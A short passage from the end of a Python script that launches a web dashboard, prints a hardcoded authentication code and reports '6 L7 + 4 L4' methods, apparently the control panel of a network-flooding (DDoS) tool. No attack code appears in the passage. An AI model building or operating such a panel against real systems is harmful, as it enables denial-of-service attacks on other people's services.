    print("╚═══════════════════════════════════════════════════════════════════════════════╝")
    print(f"")
    print(f"[INFO] Starting dashboard on http://{host}:{port}")
    print(f"[INFO] Authentication Code: 665544")
    print(f"[INFO] Methods: {len(METHODS)} (6 L7 + 4 L4)")
    print(f"[INFO] Press Ctrl+C to stop")
    print(f"")
    app.run(host=host, port=port, threaded=True, debug=False)